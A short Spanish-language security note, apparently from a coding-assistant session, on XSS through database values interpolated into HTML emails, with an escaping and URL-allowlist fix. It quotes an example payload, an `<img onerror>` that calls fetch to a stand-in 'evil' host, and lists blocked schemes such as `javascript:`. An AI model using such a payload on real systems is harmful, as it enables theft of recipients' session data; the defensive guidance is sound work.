---
title: xss en email html interpolado de bd se subestima — escape obligatorio
date: 2026-05-25
source: claude-code-session
tags: [security, email, xss]
---

XSS en email se considera "menos grave" porque "el cliente no ejecuta JS". **Falso**. Gmail web y Outlook.com renderizan parser HTML completo y aceptan handlers `onerror`, `<style>` malicioso, redirects via `<meta>`, exfil de cookies del cliente web. iOS Mail y Apple Mail también parsean HTML pero más estricto.

Vector real en SaaS multi-tenant: valores de BD (notas factura, nombre cliente, razón social org, footer extra, signature_html) interpolados en template literal HTML llegan al inbox sin escapar. Si un tenant comprometido o malicioso pone `<script>` o `<img src=x onerror="fetch('//evil...')">` en sus notas → email lo renderiza en cliente web del destinatario.

**Patrón fix** — helper único:

- `escapeHtml(s)`: `& < > " '`.
- `escapeAttr(s)`: idem + backtick.
- `escapeUrl(s)`: allowlist protocolos `http(s):`, `mailto:`, `tel:`, `data:image/*`. Rechaza `javascript:`, `data:text/html`, `vbscript:`, `file:`, protocol-relative `//`.

**Regla**: TODO valor interpolado vía template literal HTML pasa por `escapeHtml`. Sin excepciones "porque es number" (tipo Supabase puede llegar como string con `as`). URLs vía `escapeUrl`. Si quieres preservar `\n`: `escapeHtml(s).replace(/\n/g, '<br>')` — nunca al revés.

NO usar `<script>`, `<form>`, `<iframe>`, `<object>`, `<base>` en emails (clientes los strippean y suben spam score).
